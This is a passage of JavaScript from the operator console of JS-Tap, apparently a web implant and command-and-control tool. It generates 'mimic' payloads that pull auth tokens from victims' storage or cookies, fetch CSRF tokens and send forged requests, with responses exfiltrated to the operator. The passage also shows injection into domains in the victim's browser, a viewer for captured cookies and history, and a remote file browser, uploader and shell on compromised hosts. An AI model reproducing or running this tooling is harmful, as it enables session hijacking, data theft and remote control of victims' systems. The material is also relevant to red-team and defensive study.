			"Content-type": "application/json; charset=UTF-8"
		}
	});

	tokenSearchJson = await tokenSearchReq.json();

	var searchData = document.createElement('p');

	searchData.innerHTML  = '<b>CSRF Token URL:</b><br>' + tokenSearchJson.url + '<br><br>';
	searchData.innerHTML += '<b>CSRF Token file:</b><br>' + tokenSearchJson.fileName + '<br><br>';
	searchData.innerHTML += '<button type="button" class="btn btn-primary" onclick=downloadHtmlCode(' + `'` + tokenSearchJson.fileName + `'`+ ')>Download Code</button><br><br>';
	searchData.innerHTML += '<b>Click "Next" to build payload</b>';
	tokenUrl = tokenSearchJson.url;
	searchDataDiv.appendChild(searchData);
}




async function searchAuthToken(eventKey, tokenValue, apiType)
{
	var searchDataDiv = document.getElementById('apiSearchDataDiv');

	searchDataDiv.innerHTML = "";


	tokenSearchReq = await fetch('/api/apiAuthTokenSearch/' + eventKey, {
		method:"POST",
		body: JSON.stringify({
			type:apiType,
			tokenValue: tokenValue
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});

	tokenSearchJson = await tokenSearchReq.json();

	var searchData = document.createElement('p');

	if (tokenSearchJson.location === "NOT FOUND")
	{
		searchData.innerHTML  = '<b>Auth Token not found in cookies or local or session storage. </br><br><br>';
		searchData.innerHTML += '<b>Check API Call Body for authorization token. </br><br><br>';
	}
	else
	{
		searchData.innerHTML  = '<b>Auth Token Location:</b><br>' + tokenSearchJson.location + '<br><br>';
		searchData.innerHTML += '<b>Token Key:</b><br>' + tokenSearchJson.tokenName + '<br><br>';
		searchData.innerHTML += '<b>Click "Next" to build payload</b>';		
	}


	tokenLocation = tokenSearchJson.location;
	tokenKey      = tokenSearchJson.tokenName;
	searchDataDiv.appendChild(searchData);
}





async function showMimicApiModal(eventKey, apiCallDataString, apiType)
{
	initializeCodeMirror();
	console.log("Showing mimic api call modal with key: " + eventKey);

	var searchButton  = document.getElementById("mimic-api-search-button");
	var nextButton    = document.getElementById("mimic-api-next-button");
	var tokenName     = document.getElementById("apiTokenNameInput");
	var tokenValue    = document.getElementById("apiTokenValueInput");

	tokenName.value  = "";
	tokenValue.value = "";

	var tokenSearch = false;

	var apiCallData = JSON.parse(apiCallDataString);

	console.log(apiCallData);

	var apiURL    = escapeHTML(apiCallData.url);
	var apiMethod = escapeHTML(apiCallData.method);
	var apiSync   = true;
	var name      = "";
	var password  = "";

	if (apiType === "XHR")
	{
		apiAsync = escapeHTML(apiCallData.asyncRequest);
		name     = escapeHTML(apiCallData.name);
		passwrod = escapeHTML(apiCallData.password);
	}

	var apiDataDiv    = document.getElementById('apiDataDiv');
	var searchDataDiv = document.getElementById('apiSearchDataDiv');

	apiDataDiv.innerHTML = "";

	var data = document.createElement('p');
	data.innerHTML  = 'API Type: <b>' + apiType + '</b><br>';
	data.innerHTML += 'URL: <b>' + apiURL + '</b><br>';
	data.innerHTML += 'Method: <b>' + apiMethod + '</b><br>';
	data.innerHTML += '<br>';
	data.innerHTML += 'Headers:<br>';


	// headers...
	apiCallData.headers.forEach(header => {
		data.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
		data.innerHTML += "<br>";
	});

	// Show body option?

    // Append the paragraph to the dynamic div
	apiDataDiv.appendChild(data);

	searchDataDiv.innerHTML = "";


	// Need to get the request body
	if (apiType == "XHR")
	{
		xhrCallReq  = await fetch('/api/clientXhrCall/' + eventKey);
		xhrCallJson = await xhrCallReq.json();

		requestBody  = xhrCallJson.requestBody;
		responseBody = xhrCallJson.responseBody;
	}
	else if (apiType == "FETCH")
	{
		fetchCallReq  = await fetch('/api/clientFetchCall/' + eventKey);
		fetchCallJson = await fetchCallReq.json();

		requestBody  = fetchCallJson.requestBody;
		responseBody = fetchCallJson.responseBody;
	}
	else
	{
		console.log("Invalid api type in showMimicApiModal()");
	}

	console.log("In mimic API, request body is: " + atob(requestBody));



	searchButton.onclick = function(event) 
	{
		var canSearch = true;

		if (tokenName.value.trim() === "")
		{
			tokenName.classList.add('is-invalid');
			canSearch = false;
		}
		else
		{
			tokenName.classList.remove('is-invalid');
		}

		if (tokenValue.value.trim() === "")
		{
			tokenValue.classList.add('is-invalid');
			canSearch = false;
		}
		else
		{
			tokenValue.classList.remove('is-invalid');
		}

		if (canSearch)
		{
			searchAuthToken(eventKey, tokenValue.value.trim(), apiType)
			tokenSearch = true;
		}

		searchButton.blur();
	}


    // Generate a mimic payload
	nextButton.onclick = function(event)
	{
    	// Let's generate that payload
		var payload = "";

		payload += "// JS-Tap mimic generated API call payload\n";
		payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
		payload += "// ----------------------------------------------------------------------.\n";


		//  I need to body from the API call here...
		requestBodyJson = JSON.parse(atob(requestBody));

		for (let key in requestBodyJson)
		{
			if (requestBodyJson.hasOwnProperty(key))
			{
				console.log("key: " + key + ", value: " + requestBodyJson[key]);
				payload += `var var_${key} = '${requestBodyJson[key]}';\n`;
			}
		}

		payload += "// ----------------------------------------------------------------------.\n";

		switch(tokenLocation)
		{
		case 'Local Storage':
			{
				payload += `var foundAuthToken = localStorage.getItem('${tokenKey}');\n`;
			}
			break;

		case 'Session Storage':
			{
				payload += `var foundAuthToken = sessionStorage.getItem('${tokenKey}');\n`;
			}
			break;

		case 'Cookies':
			{
				payload += `var foundAuthToken = getCookie('${tokenKey}');\n`;
			}
			break;

		default:
			if (tokenSearch)
			{
				// Only matters if we're trying to search for a token
				alert('Authentication token not found.');
			}
		}


		payload += "var bodyData = {\n";

		for (let key in requestBodyJson)
		{
			if (requestBodyJson.hasOwnProperty(key)) 
	  		{  // Check if the key is not from the prototype chain
	  			var variableName = key.replace(/-/g, '_');
	  			payload += `	"${key}": var_${variableName},\n`;
	  		}		
	  	}
	  	payload += "};\n";


	  	payload += `fetch('${apiURL}', {\n`;
	  	payload += `	method: '${apiMethod}',\n`;
	  	payload += `	credentials: 'same-origin',\n`;
	  	payload += '    headers: {\n';

		// Pull the headers in:
	  	for (let key in apiCallData.headers) 
	  	{
	  		if (apiCallData.headers.hasOwnProperty(key)) 
	  		{
		        var headerInfo = apiCallData.headers[key]; // Assuming this is already an object with 'header' and 'value'

		        var headerName  = headerInfo.header;
		        var headerValue = headerInfo.value;

		        console.log('$$$$$ Header Info: ', headerInfo);
		        console.log('## Name: ' + headerName + ', Value: ' + headerValue);

		        // Check if the key is the auth token
		        if (headerName === tokenName.value.trim()) 
		        {
		            // this is our dynamic token
		        	console.log('&& found auth header!');

		            // Need to check if it uses the Bearer format
		        	if (headerValue.includes('Bearer'))
		        	{
		        		payload += `        '${headerName}': 'Bearer ' + foundAuthToken,\n`;

		        	}
		        	else
		        	{		          
		        		payload += `        '${headerName}': foundAuthToken,\n`;
		        	}
		        } 
		        else 
		        {
		        	console.log('** handling non-auth header...');
		        	payload += `        '${headerName}': '${headerValue}',\n`;
		        }
		    }
		}
		payload += '    },\n';

		payload += '	body: JSON.stringify(bodyData)\n';

		payload += "})\n";
		payload += ".then(response => {\n";
		payload += "	var statusCode = response.status;\n";
		payload += "	return response.text().then(responseBody => {\n";
		payload += "		customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
		payload += "	});\n";
		payload += "})\n";
		payload += ".catch(error => {\n";
		payload += "	customExfil('Error', 'Caught error in mimic payload');\n";
		payload += "})\n";


		nextButton.blur();
		console.log("Payload dump:");
		console.log(payload);


    	// Ok, now we need to push this into the C2 system
		var payloadNameInput   = document.getElementById('payloadName');
		var payloadDescription = document.getElementById('payloadDescription');
		//var payloadCode        = document.getElementById('payload-editor');

		payloadNameInput.value   = "Mimic API payload";
		payloadDescription.value = "Automatically generated custom payload from intercepted API network calls.";
		//payloadCode.value        = payload;
		codeEditor.setValue(payload);

		modal.hide();
		showCustomPayloadModal(true);
	}

	// Pop that sucker open
	var modal = new bootstrap.Modal(document.getElementById('createApiMimicModal'));
	modal.show();
}




async function showMimicFormModal(eventKey, formDataString)
{
	initializeCodeMirror();
	// createFormMimicModal
	console.log("Showing mimic form modal with key: " + eventKey);

	var searchButton = document.getElementById("mimic-form-search-button");
	var nextButton   = document.getElementById("mimic-form-next-button");
	var csrfName     = document.getElementById("csrfNameInput");
	var csrfValue    = document.getElementById("csrfValueInput");

	csrfName.value  = "";
	csrfValue.value = "";

	var formData = JSON.parse(formDataString);

	var formName    = escapeHTML(formData.name);
	var formContent = escapeHTML(atob(formData.data));
	var formAction  = escapeHTML(atob(formData.action))
	var formMethod  = escapeHTML(formData.method);
	var formEncType = escapeHTML(formData.encType);
	var formURL     = escapeHTML(formData.url);

	var formDataDiv   = document.getElementById('formDataDiv');
	var searchDataDiv = document.getElementById('searchDataDiv');

	formDataDiv.innerHTML = "";

	var data = document.createElement('p');
	data.innerHTML  = 'Form URL: <b>' + formURL + '</b><br>';
	data.innerHTML += 'Form Name: <b>' + formName + '</b><br>';
	data.innerHTML += 'Action: <b>' + formAction + '</b><br>';
	data.innerHTML += 'Method: <b>' + formMethod + '</b><br>';
	data.innerHTML += 'Encoding Type: <b>' + formEncType + '</b><br><br>';

	data.innerHTML += 'Content:' + '<br>';

	var formattedContent = formContent.replace(/\n/g, '<br>');

	formattedContent = formattedContent.replace(/^<br>/, '');
	data.innerHTML  += formattedContent;

    // Append the paragraph to the dynamic div
	formDataDiv.appendChild(data);

	searchDataDiv.innerHTML = "";

	searchButton.onclick = function(event) 
	{
		var canSearch = true;

		if (csrfName.value.trim() === "")
		{
			csrfName.classList.add('is-invalid');
			canSearch = false;
		}
		else
		{
			csrfName.classList.remove('is-invalid');
		}

		if (csrfValue.value.trim() === "")
		{
			csrfValue.classList.add('is-invalid');
			canSearch = false;
		}
		else
		{
			csrfValue.classList.remove('is-invalid');
		}

		if (canSearch)
		{
			searchCSRFToken(eventKey, csrfName.value.trim(), csrfValue.value.trim())
		}

		searchButton.blur();
	}

    // Prep our form parameters/values
	var lines = formContent.trim().split('\n');

	var parsedForm = lines.map(line => {
		var parts = line.trim().split(':');
		return {
			key: parts[0].trim(),
			value: parts[1].trim()
		};
	});

    // console.log("--Parsed form: ");
    // console.log(parsedForm);


    // Generate a mimic payload
	nextButton.onclick = function(event)
	{
    	// Let's generate that payload
		var payload = "";

		payload += "// JS-Tap mimic generated form submission payload\n";
		payload += "// Payload variables below with intercepted values. Modify as you see fit.\n";
		payload += "// ----------------------------------------------------------------------.\n";

		parsedForm.forEach(item => {
			var variableName = item.key.replace(/-/g, '_');

    		// Skip the CSRF variable, we'll handle that later automatically
			if (item.key.trim() === csrfName.value.trim())
			{
				return;
			}

			payload += `var var_${variableName} = '${item.value}';\n`;
		});
		payload += "// ----------------------------------------------------------------------.\n";

	    // Default type on null
		if (formEncType === null || formEncType === undefined || formEncType === '' || formEncType === 'null')
		{
			formEncType = "'application/x-www-form-urlencoded'";
		}

		// Defaults to current page if null, so the page with the CSRF token
		if (formAction === null || formAction === undefined || formAction === '' || formAction === 'null')
		{
			formAction = formURL;
		}

		payload += "\n\n";

		var haveCSRF = false;

		if (searchDataDiv.innerHTML != "")
		{
			haveCSRF = true;
		}

    	// Check if we have a CSRF token to deal with
		if (haveCSRF)
		{
    		// There is a CSRF token to contend with
			console.log("** Generating payload with a CSRF token...");
			payload += "// Get the CSRF token first\n";
			payload += "fetch('" + tokenUrl + "')\n";
			payload += "	.then(response =>{\n";
			payload += "		if(!response.ok){\n";
			payload += "			customExfil('Error', 'Error fetching CSRF Token with Mimic payload');\n";
			payload += "            throw new Error('Error fetching CSRF Token with Mimic payload');\n";
			payload += "		}\n";
			payload += "		return response.text();\n";
			payload += "	})\n";
			payload += "	.then(text => {\n";
			payload += "		var fetchedContent = text;\n";
			payload += "		var parser         = new DOMParser();\n";
			payload += "		var parsedDoc      = parser.parseFromString(fetchedContent, 'text/html');\n";
			payload += `		var tokenInput     = parsedDoc.querySelector('input[name="` + csrfName.value + `"]');\n`;
			payload += "		\n";
			payload += "		return tokenInput ? tokenInput.value : null;\n";
			payload += "	})\n";
			payload += "	.then(csrfToken => {\n";
			payload += "		if (!csrfToken) {\n";
			payload += "			customExfil('Error', 'Error using CSRF Token in mimic payload');\n";
			payload += "            throw new Error('Error using CSRF Token in Mimic payload');\n";
			payload += "		}\n\n";
		}
		
		payload += "		var bodyData = {\n";

		parsedForm.forEach((item, index, array) => {
			var variableName = item.key.replace(/-/g, '_');

			// Skip the CSRF variable, we'll handle that after the loop
			if (item.key.trim() === csrfName.value.trim())
			{
				return;
			}

			payload += `			"${item.key}": var_${variableName},\n`;
		});
		if (haveCSRF)
		{
			payload += `			"${csrfName.value.trim()}": csrfToken\n`;
		}
		payload += "		};\n";

		payload += "		// Final request is below:\n";
		payload += "		fetch('" + formAction + "', {\n";
		payload += `			method: '${formMethod}',\n`;
		payload += "			headers: {\n";
		payload += `				'Content-Type': ${formEncType},\n`;
		payload += "			},\n";

		// console.log("$$$$$ encType: " + formEncType);
		if (formEncType == "'application/x-www-form-urlencoded'")
		{

			payload += "			body: Object.keys(bodyData).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(bodyData[key])).join('&')\n";
		}
		else if (formEncType == "'application/json'")
		{
			payload += "			body: JSON.stringify(bodyData)\n";
		}
		else
		{
			console.log("*** Error, this encoding type not handled yet");
			alert('Error in mimic generator, unhandled form encoding type:\n' + formEncType);
		}

		payload += "		})\n";
		payload += "		.then(response => {\n";
		payload += "			var statusCode   = response.status;\n";
		payload += "			return response.text().then(responseBody => {\n";
		payload += "				customExfil('Payload Response, Status code: ' + statusCode, 'Response Body:' + responseBody);\n";
		payload += "			});\n";
		payload += "		})\n";
		payload += "        .catch(error => {\n";
		payload += "			customExfil('Error', 'Caught error in mimic payload');\n";
		payload += "		})\n";

		if (haveCSRF)
		{
			payload += "	});\n";
		}


		console.log("Generated payload:");
		console.log(payload);

		nextButton.blur();

    	// Ok, now we need to push this into the C2 system
		var payloadNameInput   = document.getElementById('payloadName');
		var payloadDescription = document.getElementById('payloadDescription');
		//var payloadCode        = document.getElementById('payload-editor');

		payloadNameInput.value   = "Mimic Form submission payload";
		payloadDescription.value = "Automatically generated custom payload from form submission.";
		//payloadCode.value        = payload;
		codeEditor.setValue(payload);

		modal.hide();
		showCustomPayloadModal(true);
	}

	var modal = new bootstrap.Modal(document.getElementById('createFormMimicModal'));
	modal.show();
}





function showAboutModal()
{
	var modal = new bootstrap.Modal(document.getElementById("aboutModal"));
	modal.show();
}



function showGuideModal()
{
	var modal = new bootstrap.Modal(document.getElementById("guideModal"));
	modal.show();
}




async function toggleDomainDetails(domainID, btnElement) {
	var detailsArea = document.getElementById('domain-details-' + domainID);

	if (detailsArea.style.display !== 'none') {
		// Already open, close it
		detailsArea.innerHTML = '';
        detailsArea.style.display = 'none';
		btnElement.textContent = 'View Details';
		return;
	}

	btnElement.textContent = 'Hide Details';
    detailsArea.style.display = 'block';
	
    // Tab Headers
    detailsArea.innerHTML = `
        <ul class="nav nav-tabs" id="tab-${domainID}" role="tablist">
            <li class="nav-item" role="presentation">
                <button class="nav-link active" id="history-tab-${domainID}" data-bs-toggle="tab" data-bs-target="#history-content-${domainID}" type="button" role="tab" aria-selected="true">History</button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="captures-tab-${domainID}" data-bs-toggle="tab" data-bs-target="#captures-content-${domainID}" type="button" role="tab" aria-selected="false">Captures</button>
            </li>
        </ul>
        <div class="tab-content border border-top-0 p-3" id="tabContent-${domainID}">
            <div class="tab-pane fade show active" id="history-content-${domainID}" role="tabpanel">
                <div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm" role="status"></div>&nbsp;Loading history...</div>
            </div>
            <div class="tab-pane fade" id="captures-content-${domainID}" role="tabpanel">
                <div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm" role="status"></div>&nbsp;Loading captures...</div>
            </div>
        </div>
    `;

    // Fetch History
    try {
		var visitResp = await fetch('/api/bex/visits/' + domainID);
		var visits = await visitResp.json();
        var historyContent = document.getElementById('history-content-' + domainID);

		if (visits.length === 0) {
			historyContent.innerHTML = '<div class="alert alert-secondary">No visit history found.</div>';
		} else {
            var timelineHtml = '<ul class="list-group list-group-flush">';
            for (let v of visits) {
                timelineHtml += `
                    <li class="list-group-item d-flex justify-content-between align-items-start">
                        <div class="ms-2 me-auto text-break" style="font-family: monospace; font-size: 0.9em;">
                            ${escapeHTML(v.url)}
                        </div>
                        <span class="badge bg-light text-dark rounded-pill">${humanized_time_span(v.visitTime)}</span>
                    </li>
                `;
            }
            timelineHtml += '</ul>';
            historyContent.innerHTML = timelineHtml;
        }
    } catch (e) {
        document.getElementById('history-content-' + domainID).innerHTML = '<div class="alert alert-danger">Error loading history.</div>';
    }


    // Fetch Captures
	try {
		var resp = await fetch('/api/bex/captures/' + domainID);
		var captures = await resp.json();
        var captureContent = document.getElementById('captures-content-' + domainID);

		if (captures.length === 0) {
			captureContent.innerHTML = '<div class="alert alert-secondary">No captures found for this domain.</div>';
		} else {
			var tableHtml = `
				<div class="table-responsive">
					<table class="table table-sm table-striped table-bordered">
						<thead class="table-light">
							<tr>
								<th>Type</th>
								<th>Name</th>
								<th>Value</th>
							</tr>
						</thead>
						<tbody>
			`;
			
			for (let c of captures) {
				tableHtml += `
					<tr>
						<td><span class="badge bg-secondary">${escapeHTML(c.type)}</span></td>
						<td>${escapeHTML(c.name)}</td>
						<td style="word-break: break-all; font-family: monospace; font-size: 0.9em;">${escapeHTML(c.value)}</td>
					</tr>
				`;
			}
			tableHtml += `</tbody></table></div>`;
			captureContent.innerHTML = tableHtml;
		}
	} catch (e) {
		captureContent.innerHTML = '<div class="alert alert-danger">Error loading captures.</div>';
	}
}


async function toggleBexInjection(beaconID, domain, isActive) {
    if (isActive) {
        if (confirm('Stop injecting JS-Tap into ' + domain + '?')) {
            await fetch('/api/bex/stop_inject', {
                method: 'POST',
                body: JSON.stringify({ beaconID: beaconID, domain: domain }),
                headers: { "Content-type": "application/json; charset=UTF-8" }
            });
            getClientDetails(beaconID); // Refresh
        }
    } else {
        var tag = prompt("Enter a tag for the injected client:", "bex-injected");
        if (tag) {
            await fetch('/api/bex/inject', {
                method: 'POST',
                body: JSON.stringify({ beaconID: beaconID, domain: domain, tag: tag }),
                headers: { "Content-type": "application/json; charset=UTF-8" }
            });
            // alert("Injection queued. It will start on the next beacon heartbeat.");
            getClientDetails(beaconID); // Refresh
        }
    }
}


// ---- Sidecar Functions ----

var _sidecarLastReadContent = null;
var _sidecarLastReadFileName = null;
var _sidecarCurrentPath = '';
var _sidecarShellCwd = '';
var _sidecarShellHistory = [];
var _sidecarShellHistoryIndex = -1;
var _sidecarShellOutput = '';
var _sidecarShellBeaconId = '';
var _sidecarShellNickname = '';

function sidecarDownloadFile() {
    if (!_sidecarLastReadContent || !_sidecarLastReadFileName) return;
    try {
        var raw = atob(_sidecarLastReadContent);
        var arr = new Uint8Array(raw.length);
        for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
        var blob = new Blob([arr], { type: 'application/octet-stream' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = _sidecarLastReadFileName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch (e) {
        console.error('Download failed:', e);
    }
}

async function sidecarUploadFile(beaconId) {
    var fileInput = document.getElementById('sidecar-upload-file');
    var statusDiv = document.getElementById('sidecar-upload-status');
    if (!fileInput || !statusDiv) return;

    var file = fileInput.files[0];
    if (!file) {
        statusDiv.innerHTML = '<div class="alert alert-warning alert-sm py-1">No file selected.</div>';
        return;
    }

    var maxSize = 700 * 1024;
    if (file.size > maxSize) {
        statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">File too large (' + formatSidecarBytes(file.size) + '). Maximum is 700 KB.</div>';
        return;
    }

    var base = _sidecarCurrentPath || '/';
    var sep = base.endsWith('/') || base.endsWith('\\') ? '' : '/';
    var dest = base + sep + file.name;

    statusDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-primary" role="status"></div> Uploading...';

    try {
        var buffer = await file.arrayBuffer();
        var bytes = new Uint8Array(buffer);
        var binary = '';
        for (var i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
        var b64 = btoa(binary);

        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'write_file', args: { path: dest, content: b64 } }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(errText) + '</div>';
            return;
        }

        var json = await resp.json();
        pollSidecarResult(json.requestId, function(result) {
            if (!result.success) {
                statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(result.error || 'Unknown error') + '</div>';
                return;
            }
            statusDiv.innerHTML = '<div class="alert alert-success alert-sm py-1">Uploaded ' + formatSidecarBytes(result.data.bytesWritten) + ' to <b>' + escapeHTML(result.data.path) + '</b></div>';
            fileInput.value = '';
            sidecarBrowse(beaconId);
        });
    } catch (e) {
        statusDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">Upload failed: ' + escapeHTML(String(e)) + '</div>';
    }
}

async function sidecarBrowse(beaconId) {
    var pathInput = document.getElementById('sidecar-path');
    var path = pathInput ? pathInput.value : '/';
    var resultsDiv = document.getElementById('sidecar-file-results');
    if (!resultsDiv) return;
    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-primary" role="status"></div> Browsing...';

    try {
        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'list_dir', args: { path: path } }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(errText) + '</div>';
            return;
        }

        var json = await resp.json();
        pollSidecarResult(json.requestId, function(result) {
            if (!result.success) {
                resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(result.error) + '</div>';
                return;
            }
            var entries = (result.data && result.data.entries) || [];
            var resolvedPath = (result.data && result.data.path) || path;

            // Update path input to resolved absolute path
            _sidecarCurrentPath = resolvedPath;
            if (pathInput) pathInput.value = resolvedPath;

            var html = '<table class="table table-sm table-striped mb-0" style="font-size: 0.85em;">';
            html += '<thead><tr><th>Name</th><th>Size</th><th>Modified</th><th></th></tr></thead><tbody>';

            // Parent directory link
            if (resolvedPath !== '/' && resolvedPath !== '') {
                var parentPath = resolvedPath.replace(/\\/g, '/');
                var parts = parentPath.split('/').filter(Boolean);
                parts.pop();
                var parent = parts.length === 0 ? '/' : '/' + parts.join('/');
                // Windows: if path like C:/foo, parent should be C:/
                if (/^[A-Za-z]:/.test(resolvedPath)) {
                    var wparts = resolvedPath.replace(/\\/g, '/').split('/').filter(Boolean);
                    wparts.pop();
                    parent = wparts.length === 0 ? resolvedPath.substring(0, 3) : wparts.join('/');
                }
                html += '<tr><td><a href="#" onclick="sidecarNavigate(\'' + beaconId + '\', \'' + escapeHTML(parent).replace(/'/g, "\\'") + '\'); return false;">..</a></td><td></td><td></td><td></td></tr>';
            }

            entries.forEach(function(e) {
                var sep = resolvedPath.endsWith('/') || resolvedPath.endsWith('\\') ? '' : '/';
                var fullPath = resolvedPath + sep + e.name;
                if (e.isDir) {
                    html += '<tr><td><a href="#" onclick="sidecarNavigate(\'' + beaconId + '\', \'' + escapeHTML(fullPath).replace(/'/g, "\\'") + '\'); return false;">&#128193; ' + escapeHTML(e.name) + '/</a></td>';
                } else {
                    html += '<tr><td>' + escapeHTML(e.name) + '</td>';
                }
                html += '<td>' + (e.isDir ? '' : formatSidecarBytes(e.size)) + '</td>';
                html += '<td><small>' + escapeHTML(e.modTime || '') + '</small></td>';
                if (!e.isDir) {
                    html += '<td><button class="btn btn-outline-primary btn-sm py-0 px-1" style="font-size:0.75em;" onclick="sidecarReadFile(\'' + beaconId + '\', \'' + escapeHTML(fullPath).replace(/'/g, "\\'") + '\')">Read</button></td>';
                } else {
                    html += '<td></td>';
                }
                html += '</tr>';
            });
            html += '</tbody></table>';
            resultsDiv.innerHTML = html;
        });
    } catch (e) {
        resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">Request failed: ' + escapeHTML(String(e)) + '</div>';
    }
}


function sidecarNavigate(beaconId, path) {
    var pathInput = document.getElementById('sidecar-path');
    if (pathInput) pathInput.value = path;
    sidecarBrowse(beaconId);
}


function sidecarShellUpdatePrompt() {
    var prompt = document.getElementById('sidecar-shell-prompt');
    if (prompt) prompt.textContent = (_sidecarShellCwd || '~') + ' $ ';
}

function sidecarShellAppendOutput(html) {
    _sidecarShellOutput += html;
    var outputDiv = document.getElementById('sidecar-shell-output');
    if (outputDiv) {
        outputDiv.innerHTML = _sidecarShellOutput;
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
}

function sidecarShellRemoveRunning(runId) {
    var marker = 'id="shell-running-' + runId + '"';
    _sidecarShellOutput = _sidecarShellOutput.replace(new RegExp('<div [^>]*' + marker.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '[^>]*>.*?</div>'), '');
    var el = document.getElementById('shell-running-' + runId);
    if (el) el.remove();
}

async function sidecarShellExec(beaconId) {
    var cmdInput = document.getElementById('sidecar-shell-input');
    var rawCmd = cmdInput ? cmdInput.value : '';
    if (!rawCmd.trim()) return;
    cmdInput.value = '';

    _sidecarShellHistory.push(rawCmd);
    _sidecarShellHistoryIndex = _sidecarShellHistory.length;

    var cwdEscaped = _sidecarShellCwd.replace(/'/g, "'\\''");
    var wrappedCmd;
    if (_sidecarShellCwd) {
        wrappedCmd = "cd '" + cwdEscaped + "' && " + rawCmd + "; echo '__SIDECAR_CWD__'; pwd";
    } else {
        wrappedCmd = rawCmd + "; echo '__SIDECAR_CWD__'; pwd";
    }

    var promptText = escapeHTML((_sidecarShellCwd || '~') + ' $ ' + rawCmd);
    var runId = Date.now() + '' + Math.random();
    sidecarShellAppendOutput('<div style="color:#6c9;white-space:pre-wrap;">' + promptText + '</div>');
    sidecarShellAppendOutput('<div id="shell-running-' + escapeHTML(runId) + '" style="color:#888;"><span class="spinner-border spinner-border-sm" role="status"></span> Running...</div>');

    try {
        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'exec_cmd', args: { command: wrappedCmd } }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            sidecarShellRemoveRunning(runId);
            sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">ERROR: ' + escapeHTML(errText) + '</div>');
            return;
        }

        var json = await resp.json();
        pollSidecarResult(json.requestId, function(result) {
            sidecarShellRemoveRunning(runId);
            if (!result.success) {
                sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">ERROR: ' + escapeHTML(result.error || 'Unknown error') + '</div>');
                return;
            }

            var stdout = (result.data && result.data.stdout) || '';
            var stderr = (result.data && result.data.stderr) || '';

            // Parse CWD from stdout
            var markerStr = '__SIDECAR_CWD__';
            var markerIdx = stdout.lastIndexOf(markerStr);
            if (markerIdx !== -1) {
                var cmdOutput = stdout.substring(0, markerIdx).replace(/\n$/, '');
                var newCwd = stdout.substring(markerIdx + markerStr.length).trim();
                if (newCwd) _sidecarShellCwd = newCwd;
                if (cmdOutput) {
                    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(cmdOutput) + '</div>');
                }
            } else {
                // Marker not found (timeout or binary output) — show all stdout
                if (stdout) {
                    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(stdout) + '</div>');
                }
            }

            if (stderr) {
                sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">' + escapeHTML(stderr) + '</div>');
            }

            sidecarShellUpdatePrompt();
        });
    } catch (e) {
        sidecarShellRemoveRunning(runId);
        sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">Request failed: ' + escapeHTML(String(e)) + '</div>');
    }
}

function sidecarShellKeyHandler(event, beaconId) {
    if (event.key === 'Enter') {
        sidecarShellExec(beaconId);
    } else if (event.key === 'ArrowUp') {
        event.preventDefault();
        if (_sidecarShellHistoryIndex > 0) {
            _sidecarShellHistoryIndex--;
            event.target.value = _sidecarShellHistory[_sidecarShellHistoryIndex];
        }
    } else if (event.key === 'ArrowDown') {
        event.preventDefault();
        if (_sidecarShellHistoryIndex < _sidecarShellHistory.length - 1) {
            _sidecarShellHistoryIndex++;
            event.target.value = _sidecarShellHistory[_sidecarShellHistoryIndex];
        } else {
            _sidecarShellHistoryIndex = _sidecarShellHistory.length;
            event.target.value = '';
        }
    }
}

function sidecarPopOutShell(beaconId) {
    var popWin = window.open('about:blank', '_blank', 'width=800,height=600,menubar=no,toolbar=no,location=no,status=no');
    if (!popWin) { alert('Pop-up blocked. Please allow pop-ups for this site.'); return; }

    var titleText = 'Sidecar Shell - ' + (_sidecarShellNickname || beaconId);
    var transferState = {
        beaconId: beaconId,
        cwd: _sidecarShellCwd,
        history: _sidecarShellHistory.slice(),
        output: _sidecarShellOutput,
        nickname: _sidecarShellNickname || beaconId
    };

    var htmlContent = '<!DOCTYPE html><html><head><title>' + escapeHTML(titleText) + '</title>' +
    '<style>' +
    '*, *::before, *::after { box-sizing: border-box; }' +
    'body { margin:0; padding:0; background:#1e1e1e; color:#ddd; font-family:monospace; font-size:14px; display:flex; flex-direction:column; height:100vh; }' +
    '#title-bar { background:#333; padding:6px 12px; display:flex; align-items:center; gap:8px; }' +
